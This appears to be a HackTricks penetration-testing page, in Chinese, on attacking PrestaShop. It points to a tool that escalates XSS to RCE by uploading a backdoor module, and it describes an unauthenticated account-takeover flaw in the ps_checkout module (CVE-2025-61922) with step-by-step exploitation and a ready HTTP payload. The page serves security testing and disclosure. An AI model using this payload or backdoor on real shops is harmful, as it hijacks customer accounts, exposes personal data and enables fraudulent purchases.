# PrestaShop

{{#include ../../banners/hacktricks-training.md}}

## From XSS to RCE

- [**PrestaXSRF**](https://github.com/nowak0x01/PrestaXSRF): PrestaShop 利用脚本，可将 **XSS 提升为 RCE 或其他严重漏洞。** 更多信息请查看 [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)。它提供 **对 PrestaShop Versions 8.X.X 和 1.7.X.X 的支持，并允许：**
- _**(RCE) PSUploadModule(); - Upload a custom Module:**_ 上传一个持久化的 Module（backdoor）到 PrestaShop。

## ps_checkout ExpressCheckout silent login account takeover (CVE-2025-61922)

> 缺少对 `ps_checkout` 模块 `< 5.0.5` 的身份验证，允许未认证的攻击者 **通过提供邮箱切换会话到任意客户**。

- **端点（未认证）：** `POST /module/ps_checkout/ExpressCheckout`.
- **流程：** `ExpressCheckout.php` 接受攻击者的 JSON，仅检查 `orderID`，构建 `ExpressCheckoutRequest` 并调用 `ExpressCheckoutAction::execute()`。
- **认证漏洞：** 在易受影响的版本中，当没有用户登录时，`ExpressCheckoutAction` 会调用 `CustomerAuthenticationAction::execute()`。该方法仅执行 `customerExists(<payer_email>)` 和 `context->updateCustomer(new Customer($id))`，所以 **邮箱存在 == 登录**（没有密码/令牌检查）。
- **攻击者可控的邮箱字段：** JSON 负载中的 `order.payer.email_address` 会被 `ExpressCheckoutRequest::getPayerEmail()` 读取。

### 利用步骤

1. 收集任意已注册的客户邮箱（管理员账户是单独的，不受此流程影响）。
2. 向该 controller 发送未认证的 POST，请求中包含 `orderID` 以及受害者邮箱于 `order.payer.email_address`。
3. 即使端点返回 `500`，响应也会包含受害者客户上下文的 cookies（会话已被切换），从而可以访问 PII 或使用已保存的卡进行购买。
```http
POST /module/ps_checkout/ExpressCheckout HTTP/1.1
Host: `<target>`
Content-Type: application/json
Content-Length: 72

{"orderID":"1","order":{"payer":{"email_address":"victim@example.com"}}}
```
## 参考资料

- [CVE-2025-61922: Zero-Click Account Takeover on Prestashop (blog)](https://dhakal-ananda.com.np/blogs/cve-2025-61922-analysis/)
- [GitHub Advisory GHSA-54hq-mf6h-48xh](https://github.com/PrestaShopCorp/ps_checkout/security/advisories/GHSA-54hq-mf6h-48xh)

{{#include ../../banners/hacktricks-training.md}}
